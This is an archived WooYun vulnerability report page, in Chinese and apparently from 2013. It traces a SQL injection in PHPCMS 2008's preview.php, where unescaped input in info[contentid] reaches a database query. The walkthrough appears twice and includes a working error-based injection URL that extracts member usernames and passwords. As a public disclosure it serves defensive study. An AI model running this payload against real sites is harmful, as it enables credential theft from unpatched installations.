@@ -1,0 +1,315 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		PHPCMS 2008 最新漏洞（第二季）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		PHPCMS 2008 最新漏洞（第二季）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/西毒">西毒</a> 
+</li><li>提交时间：		2013-04-18 22:40</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-04-18：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-04-23：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">第二季来了哈...亲</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">在preview.php 中第7行<br />
+<br />
+$r = new_stripslashes($info);<br />
+<br />
+我们跟踪new_stripslashes这个函数<br />
+<br />
+在global.func.php中可以找到<br />
+<br />
+</p><pre><code>function new_stripslashes($string)<br />
+{<br />
+    if(!is_array($string)) return stripslashes($string);<br />
+    foreach($string as $key =&gt; $val) $string[$key] = new_stripslashes($val);<br />
+    return $string;<br />
+}</code></pre><p class='detail'><br />
+<br />
+这个函数的功能不用解释了吧<br />
+<br />
+所以我们看具体应用点再哪？<br />
+<br />
+</p><pre><code>require dirname(__FILE__).&#039;/include/common.inc.php&#039;;<br />
+if(!$_userid) showmessage(&#039;禁止访问&#039;); // 所以前提是我们注册个会员就ok了.<br />
+require_once CACHE_MODEL_PATH.&#039;content_output.class.php&#039;;<br />
+require_once &#039;output.class.php&#039;;<br />
+if(!is_array($info)) showmessage(&#039;信息预览不能翻页&#039;);//这里将要带进来我们的危险参数了<br />
+$r = new_stripslashes($info);   //反转义了.....关键<br />
+$C = cache_read(&#039;category_&#039;.$r[&#039;catid&#039;].&#039;.php&#039;);<br />
+$out = new content_output();<br />
+$r[&#039;userid&#039;] = $_userid;<br />
+$r[&#039;inputtime&#039;] = TIME;<br />
+$data = $out-&gt;get($r);<br />
+extract($data);<br />
+$userid = $_username;<br />
+for($i=1;$i&lt;10;$i++)<br />
+{<br />
+    $str_attachmentArray[$i] = array(&quot;filepath&quot; =&gt; &quot;images/preview.gif&quot;,&quot;description&quot; =&gt; &quot;这里是图片的描述&quot;,&quot;thumb&quot;=&gt;&quot;images/thumb_60_60_preview.gif&quot;);<br />
+}<br />
+        <br />
+$array_images = $str_attachmentArray;<br />
+$images_number = 10;<br />
+$allow_priv = $allow_readpoint = 1;<br />
+$updatetime = date(&#039;Y-m-d H:i:s&#039;,TIME);<br />
+        <br />
+$page = max(intval($page), 1);<br />
+$pages = $titles = &#039;&#039;;<br />
+if(strpos($content, &#039;[page]&#039;) !== false)  //这里必须还有这个[page]这个字符.....才能操作哈<br />
+{<br />
+    require_once &#039;url.class.php&#039;;<br />
+    $curl = new url();<br />
+    $contents = array_filter(explode(&#039;[page]&#039;, $content));<br />
+    $pagenumber = count($contents);<br />
+    for($i=1; $i&lt;=$pagenumber; $i++)<br />
+    {<br />
+        $pageurls[$i] = $curl-&gt;show($r[&#039;contentid&#039;], $i, $r[&#039;catid&#039;], $r[&#039;inputtime&#039;]);//这里contentid进入SQL语句当中<br />
+    }</code></pre><p class='detail'><br />
+<br />
+其中细节我就不说了...<br />
+<br />
+我们看看这个$curl资源句柄中的show方法<br />
+<br />
+</p><pre><code>$pageurls[$i] = $curl-&gt;show($r[&#039;contentid&#039;], $i, $r[&#039;catid&#039;], $r[&#039;inputtime&#039;]);</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>function show($contentid, $page = 0, $catid = 0, $time = 0, $prefix = &#039;&#039;)<br />
+    {<br />
+        global $PHPCMS;<br />
+        if($catid == 0 || $time == 0 || $prefix == &#039;&#039;)<br />
+        {<br />
+            $r = $this-&gt;db-&gt;get_one(&quot;SELECT * FROM `&quot;.DB_PRE.&quot;content` WHERE `contentid`=&#039;$contentid&#039;&quot;);<br />
+            if($r[&#039;isupgrade&#039;] &amp;&amp; !empty($r[&#039;url&#039;]))<br />
+            {</code></pre><p class='detail'><br />
+<br />
+所以结合前面的......我们x站了吧<br />
+<br />
+www.xxxxx.com/preview.php?info[catid]=15&amp;content=a[page]b&amp;info[contentid]=2&#039; and (select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,username,0x3a,password,0x27,0x7e) from phpcms_member limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a)-- a<br />
+<br />
+</p><p class="detail"><a href="../images/182216567f2c1489db4599142c49c72e768b4f0a.jpg" target="_blank"><img src="../images/182216567f2c1489db4599142c49c72e768b4f0a.jpg" alt="WKN4OA]}U2]H{X8VG@G`KTM.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+最后想说一句  360漏洞收购计划价格真心低...... 通杀版的getshell 才1500...<br />
+<br />
+这么低的价格....我觉得宁愿拒绝好了.. </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">在preview.php 中第7行<br />
+<br />
+$r = new_stripslashes($info);<br />
+<br />
+我们跟踪new_stripslashes这个函数<br />
+<br />
+在global.func.php中可以找到<br />
+<br />
+</p><pre><code>function new_stripslashes($string)<br />
+{<br />
+    if(!is_array($string)) return stripslashes($string);<br />
+    foreach($string as $key =&gt; $val) $string[$key] = new_stripslashes($val);<br />
+    return $string;<br />
+}</code></pre><p class='detail'><br />
+<br />
+这个函数的功能不用解释了吧<br />
+<br />
+所以我们看具体应用点再哪？<br />
+<br />
+</p><pre><code>require dirname(__FILE__).&#039;/include/common.inc.php&#039;;<br />
+if(!$_userid) showmessage(&#039;禁止访问&#039;); // 所以前提是我们注册个会员就ok了.<br />
+require_once CACHE_MODEL_PATH.&#039;content_output.class.php&#039;;<br />
+require_once &#039;output.class.php&#039;;<br />
+if(!is_array($info)) showmessage(&#039;信息预览不能翻页&#039;);//这里将要带进来我们的危险参数了<br />
+$r = new_stripslashes($info);   //反转义了.....关键<br />
+$C = cache_read(&#039;category_&#039;.$r[&#039;catid&#039;].&#039;.php&#039;);<br />
+$out = new content_output();<br />
+$r[&#039;userid&#039;] = $_userid;<br />
+$r[&#039;inputtime&#039;] = TIME;<br />
+$data = $out-&gt;get($r);<br />
+extract($data);<br />
+$userid = $_username;<br />
+for($i=1;$i&lt;10;$i++)<br />
+{<br />
+    $str_attachmentArray[$i] = array(&quot;filepath&quot; =&gt; &quot;images/preview.gif&quot;,&quot;description&quot; =&gt; &quot;这里是图片的描述&quot;,&quot;thumb&quot;=&gt;&quot;images/thumb_60_60_preview.gif&quot;);<br />
+}<br />
+        <br />
+$array_images = $str_attachmentArray;<br />
+$images_number = 10;<br />
+$allow_priv = $allow_readpoint = 1;<br />
+$updatetime = date(&#039;Y-m-d H:i:s&#039;,TIME);<br />
+        <br />
+$page = max(intval($page), 1);<br />
+$pages = $titles = &#039;&#039;;<br />
+if(strpos($content, &#039;[page]&#039;) !== false)  //这里必须还有这个[page]这个字符.....才能操作哈<br />
+{<br />
+    require_once &#039;url.class.php&#039;;<br />
+    $curl = new url();<br />
+    $contents = array_filter(explode(&#039;[page]&#039;, $content));<br />
+    $pagenumber = count($contents);<br />
+    for($i=1; $i&lt;=$pagenumber; $i++)<br />
+    {<br />
+        $pageurls[$i] = $curl-&gt;show($r[&#039;contentid&#039;], $i, $r[&#039;catid&#039;], $r[&#039;inputtime&#039;]);//这里contentid进入SQL语句当中<br />
+    }</code></pre><p class='detail'><br />
+<br />
+其中细节我就不说了...<br />
+<br />
+我们看看这个$curl资源句柄中的show方法<br />
+<br />
+</p><pre><code>$pageurls[$i] = $curl-&gt;show($r[&#039;contentid&#039;], $i, $r[&#039;catid&#039;], $r[&#039;inputtime&#039;]);</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>function show($contentid, $page = 0, $catid = 0, $time = 0, $prefix = &#039;&#039;)<br />
+    {<br />
+        global $PHPCMS;<br />
+        if($catid == 0 || $time == 0 || $prefix == &#039;&#039;)<br />
+        {<br />
+            $r = $this-&gt;db-&gt;get_one(&quot;SELECT * FROM `&quot;.DB_PRE.&quot;content` WHERE `contentid`=&#039;$contentid&#039;&quot;);<br />
+            if($r[&#039;isupgrade&#039;] &amp;&amp; !empty($r[&#039;url&#039;]))<br />
+            {</code></pre><p class='detail'><br />
+<br />
+所以结合前面的......我们x站了吧<br />
+<br />
+www.xxxxx.com/preview.php?info[catid]=15&amp;content=a[page]b&amp;info[contentid]=2&#039; and (select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,username,0x3a,password,0x27,0x7e) from phpcms_member limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a)-- a<br />
+<br />
+</p><p class="detail"><a href="../images/182216567f2c1489db4599142c49c72e768b4f0a.jpg" target="_blank"><img src="../images/182216567f2c1489db4599142c49c72e768b4f0a.jpg" alt="WKN4OA]}U2]H{X8VG@G`KTM.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+最后想说一句  360漏洞收购计划价格真心低...... 通杀版的getshell 才1500...<br />
+<br />
+这么低的价格....我觉得宁愿拒绝好了.. </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/西毒" title="西毒">西毒</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-022112" title="PHPCMS 2008 最新漏洞（第二季）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-04-18 22:40</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="22112";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
